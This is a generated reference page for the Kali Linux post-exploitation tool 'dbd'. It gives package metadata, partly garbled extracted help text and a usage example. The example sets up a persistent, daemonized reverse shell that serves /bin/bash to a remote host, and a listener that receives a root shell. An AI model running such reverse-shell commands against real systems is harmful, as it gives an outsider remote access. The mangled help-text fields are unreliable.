---
tool_id: dbd
title: dbd
categories: ["post-exploitation"]
category_slugs: ["post-exploitation"]
homepage: https://github.com/gitdurandal/dbd
repository: 
version: 1.50-1kali7
architectures: any
license: 
binaries: []
metapackages: ["kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-linux-nethunter kali-tools-post-exploitation kali-tools-windows-resources"]
icon: images/dbd-logo.svg
source_path: kali-tools\dbd\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.861658
---

# Tool: dbd (dbd)

## Categories
- [post-exploitation](../post-exploitation.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/gitdurandal/dbd](https://github.com/gitdurandal/dbd) |
| Repository |  |
| Version | 1.50-1kali7 |
| Architectures | any |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-linux-nethunter kali-tools-post-exploitation kali-tools-windows-resources |
| Icon | images/dbd-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/dbd
- **PackagesInfo**: |
- ****Installed size**: ** `2.84 MB`
- ****How to install**: ** `sudo apt install dbd`
- **root@kali**: ~# dbd -h
- **$Id**: dbd.c,v 1.50 2013/05/20 15:40:00 durandal Exp $
- **connect (tcp)**: dbd [-options] host port
- **listen (tcp)**: dbd -l -p port [-options]
- **options**: []
- **Christophe Devine - http**: //www.cr0.net:8040/) or not
- **default is**: -c on
- **sequence (for e.g. chatting). default is**: -H off
- **unix-like OS specific options**: []
- **-D on|off   fork and run in background (daemonize). default**: -D off


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## dbd Usage Example

On the client, respawn every 2400 seconds (`-r 2400`), run as a daemon (`-D on`), display verbose output (`-v`), and serve a bash shell (`-e /bin/bash`), connecting to the remote host (`192.168.1.202`) on port 8080 (`8080`).

On the server, listen for a connection (`-l`) on port 8080 (`-p8080`), and display verbose output (-v).

```console
root@kali:~# dbd -r 2400 -D on -v -e /bin/bash 192.168.1.202 8080
```


```console
root@kali:~# dbd -l -p8080 -v
listening on port 8080
reverse lookup of 192.168.1.202 failed: Unknown server error
connect to 192.168.1.202:8080 from 192.168.1.202:58651 (n/a)
id
uid=0(root) gid=0(root) groups=0(root)
```


## Source
- Path: kali-tools\dbd\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.861658
